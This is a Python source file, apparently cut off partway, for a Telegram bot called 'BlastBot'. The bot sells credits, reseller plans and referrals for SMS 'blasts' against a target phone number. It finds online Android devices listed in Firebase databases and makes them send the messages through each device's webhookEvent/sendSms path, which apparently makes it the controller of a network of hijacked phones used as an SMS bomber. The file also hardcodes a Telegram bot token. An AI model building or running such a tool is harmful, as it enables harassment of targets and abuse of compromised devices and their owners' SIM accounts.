import asyncio, json, os, time, logging, random, string, threading
from io import BytesIO
from datetime import datetime, timedelta
from copy import deepcopy
from collections import defaultdict

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"      # 🔥
EMOJI_STAR = "5372849966689566579"      # ⭐
EMOJI_ROCKET = "5359664288241829619"    # 🚀
EMOJI_CROWN = "6237927637906364256"     # 👑
EMOJI_SHIELD = "6235476345451716705"    # 🛡
EMOJI_MONEY = "6244678063775289843"     # 💰
EMOJI_PHONE = "6239930832128056797"     # 📱
EMOJI_CHECK = "4958689671950369798"     # ✅
EMOJI_CROSS = "4958900559139570572"     # ❌
EMOJI_WARNING = "4958526153955476488"   # ⚠️
EMOJI_LOCK = "4956719506027185156"      # 🔒
EMOJI_GIFT = "5084613633418199991"      # 🎁
EMOJI_BELL = "5098265504796115765"      # 🔔
EMOJI_GEAR = "5116414868357907335"      # ⚙️
EMOJI_VIDEO = "5372849966689566579"     # 📹

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    if emoji_id:
        return InlineKeyboardButton(text=label, callback_data=callback_data, icon_custom_emoji_id=emoji_id)
    return InlineKeyboardButton(text=label, callback_data=callback_data)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    if emoji_id:
        return InlineKeyboardButton(text=label, url=url, icon_custom_emoji_id=emoji_id)
    return InlineKeyboardButton(text=label, url=url)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    kb_btn = KeyboardButton(text=sc(text), request_contact=request_contact, request_location=request_location)
    if style in ["primary", "success", "danger"]:
        setattr(kb_btn, "style", style)
    return kb_btn

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")]
        ],
        resize_keyboard=True
    )

MAIN_OWNER = 6740672452
SUPER_ADMIN_NAME = "@silentrohanff"
SUPER_ADMIN_LINK = "https://t.me/silentrohanff"
SUPER_ADMINS = [6740672452]

BOT_TOKEN = "8715522455:AAHH91smqYLEuPf6b6QVPDxA7THEuw_kop4"
LOG_CHANNEL_ID = -1004378992481

_DATA_FILE = "blast_data.json"
_PREMIUM_FILE = os.path.join(os.path.dirname(os.path.abspath(_DATA_FILE)), "PRIYANSHU.json")
_PREMIUM_DB_LOCK = asyncio.Lock()
_VERSION = "v7.7-PREMIUM"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 60.0

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    # Reseller-specific FSM states
    reseller_send_number = State()
    reseller_send_message = State()
    reseller_send_speed = State()
    reseller_send_count = State()
    reseller_add_credit_uid = State()
    reseller_add_credit_amount = State()
    reseller_deduct_credit_uid = State()
    reseller_deduct_credit_amount = State()
    reseller_redeem_credits = State()
    reseller_redeem_uses = State()
    reseller_protect_number = State()
    owner_reseller_topup_uid = State()
    owner_reseller_topup_amount = State()
    # Premium credit system FSM states
    premium_add_user = State()
    premium_add_amount = State()
    premium_import_file = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "resellers": [],
        "reseller_balances": {},
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": []
    }

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            data.setdefault("resellers", [])
            data.setdefault("reseller_balances", {})
            # Backward-compatible normalization for reseller storage.
            data["resellers"] = list(dict.fromkeys(int(x) for x in data.get("resellers", []) if str(x).lstrip("-").isdigit()))
            data["reseller_balances"] = {str(k): int(v) for k, v in data.get("reseller_balances", {}).items() if str(v).lstrip("-").isdigit()}
            for rid in data["resellers"]:
                data["reseller_balances"].setdefault(str(rid), 0)
            for uid_str, u in data.get("users", {}).items():
                if "credits" not in u:
                    u["credits"] = 0
                if "sms_history" not in u:
                    u["sms_history"] = []
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)
    return d

def save(d: dict):
    with open(_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(d, f, indent=2, ensure_ascii=False)


def is_premium_admin(uid: int) -> bool:
    """Only MAIN_OWNER and hardcoded SUPER_ADMINS can manage premium credits."""
    return uid == MAIN_OWNER or uid in SUPER_ADMINS


async def load_premium_db() -> dict[int, int]:
    """Load the independent premium-credit database from PRIYANSHU.json."""
    async with _PREMIUM_DB_LOCK:
        if not os.path.exists(_PREMIUM_FILE):
            return {}
        try:
            with open(_PREMIUM_FILE, "r", encoding="utf-8") as f:
                raw = json.load(f)
            if not isinstance(raw, dict):
                return {}
            data = {}
            for uid_text, credit in raw.items():
                try:
                    uid = int(uid_text)
                    credit = int(credit)
                    if uid > 0 and credit >= 0:
                        data[uid] = credit
                except (TypeError, ValueError):
                    continue
            return data
        except (OSError, json.JSONDecodeError) as e:
            log.error(f"Premium DB load error: {e}")
            return {}


async def save_premium_db(data: dict[int, int]):
    """Atomically rewrite PRIYANSHU.json."""
    async with _PREMIUM_DB_LOCK:
        os.makedirs(os.path.dirname(_PREMIUM_FILE) or ".", exist_ok=True)
        tmp_file = _PREMIUM_FILE + ".tmp"
        payload = {str(int(uid)): int(credit) for uid, credit in sorted(data.items()) if int(uid) > 0 and int(credit) >= 0}
        with open(tmp_file, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, ensure_ascii=False)
        os.replace(tmp_file, _PREMIUM_FILE)


async def add_premium_credit(user_id: int, amount: int) -> int:
    """Add premium credits and return the new balance."""
    if amount <= 0:
        raise ValueError("Premium credit amount must be positive")
    data = await load_premium_db()
    data[user_id] = data.get(user_id, 0) + amount
    await save_premium_db(data)
    return data[user_id]


async def set_premium_credit(user_id: int, amount: int):
    """Set a user's premium balance to an exact value."""
    if user_id <= 0 or amount < 0:
        raise ValueError("Invalid premium user ID or credit amount")
    data = await load_premium_db()
    data[user_id] = amount
    await save_premium_db(data)


async def _replace_premium_db(data: dict[int, int]):
    """Full-replace helper used by import; writes exactly the supplied dataset."""
    await save_premium_db(data)


async def _send_premium_export(bot: Bot, chat_id: int, empty_text: str = "No premium credits data found."):
    """Send the current PRIYANSHU.json as a Telegram document."""
    async with _PREMIUM_DB_LOCK:
        if not os.path.exists(_PREMIUM_FILE):
            content = b""
        else:
            try:
                with open(_PREMIUM_FILE, "rb") as f:
                    content = f.read()
            except OSError as e:
                log.error(f"Premium export read error: {e}")
                content = b""

        if not content.strip():
            await bot.send_message(chat_id, empty_text)
            return False

        # Use the exact on-disk file so export matches import format byte-for-byte.
        await bot.send_document(
            chat_id,
            document=FSInputFile(_PREMIUM_FILE),
            caption=f"{em(EMOJI_MONEY, '💎')} <b>Premium Credits Database</b>",
            parse_mode="HTML"
        )
        return True


async def background_premium_exporter(bot: Bot):
    """Send the premium database to MAIN_OWNER every day at 01:01 server time."""
    log.info("Background Premium Exporter STARTED")
    while True:
        now = datetime.now()
        next_run = now.replace(hour=1, minute=1, second=0, microsecond=0)
        if next_run <= now:
            next_run = next_run + timedelta(days=1)
        delay = max(1.0, (next_run - now).total_seconds())
        await asyncio.sleep(delay)
        try:
            await _send_premium_export(bot, MAIN_OWNER, "No premium credits to export.")
            log.info("Automatic premium credits export sent")
        except Exception as e:
            log.error(f"Automatic premium export failed: {e}")

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_reseller(uid: int, d: dict) -> bool:
    return uid in d.get("resellers", []) and not is_owner(uid, d) and uid not in d.get("admins", [])

def is_privileged_target(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", []) or uid in d.get("resellers", [])

def reseller_balance(uid: int, d: dict) -> int:
    return int(d.get("reseller_balances", {}).get(str(uid), 0))

def set_reseller_balance(uid: int, amount: int, d: dict):
    d.setdefault("reseller_balances", {})[str(uid)] = max(0, int(amount))

def add_reseller_balance(uid: int, amount: int, d: dict):
    set_reseller_balance(uid, reseller_balance(uid, d) + amount, d)

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if is_reseller(uid, d): return f"{em(EMOJI_MONEY, '💼')} ʀᴇsᴇʟʟᴇʀ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍE! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢")
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS

    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."

    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"

    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME

    if time_diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴅᴇᴠɪᴄᴇs"
    elif time_diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"
    else:
        return f"{em(EMOJI_CROSS, '🔴')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan

            CACHED_DEVICES = devices

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time())
                }
            LAST_SCAN_TIME = time.time()

            health_entry = {
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            }
            DEVICE_HEALTH_LOG.append(health_entry)
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                log.info(f"[BG-SCAN] {len(devices)} devices online | {len(fbs)} DBs | {scan_duration:.1f}s")

                current_fb_ids = {fb["id"] for fb in fbs}
                stale_fb_ids = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
                for stale in stale_fb_ids:
                    FB_DEVICE_COUNTS.pop(stale, None)

                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ-sᴄᴀɴ: ᴇᴠᴇʀʏ <b>1 ᴍɪɴᴜᴛᴇ</b>\n"
                            f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ ᴛɪᴍᴇ: <b>{scan_duration:.1f}s</b>\n\n"
                            f"<i>{sc('bot is now running in ultra mode with per-user sessions.')}</i>",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        log.warning(f"Owner notify failed: {e}")
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"

        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    _dev_sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200:
                        return
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict):
                        return

                    async def fetch_dev(dev_id: str):
                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        txt2 = (await r2.text()).strip()
                                        if txt2 == "null" or not txt2:
                                            return None
                                        dev_data = json.loads(txt2)
                                        if isinstance(dev_data, dict) and device_is_online(dev_data):
                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                            sims = dev_data.get("sims", [])
                                            return {
                                                "fb_id": fb["id"],
                                                "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id,
                                                "dev_name": name,
                                                "sims": sims,
                                            }
                        except Exception as e:
                            log.warning(f"Device fetch {dev_id}: {e}")
                        return None

                    dev_ids = list(device_ids.keys())
                    for i in range(0, len(dev_ids), 20):
                        batch = dev_ids[i:i+20]
                        dev_tasks = [fetch_dev(dev_id) for dev_id in batch]
                        dev_results = await asyncio.gather(*dev_tasks)
                        for res in dev_results:
                            if res:
                                results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []

    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []

    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
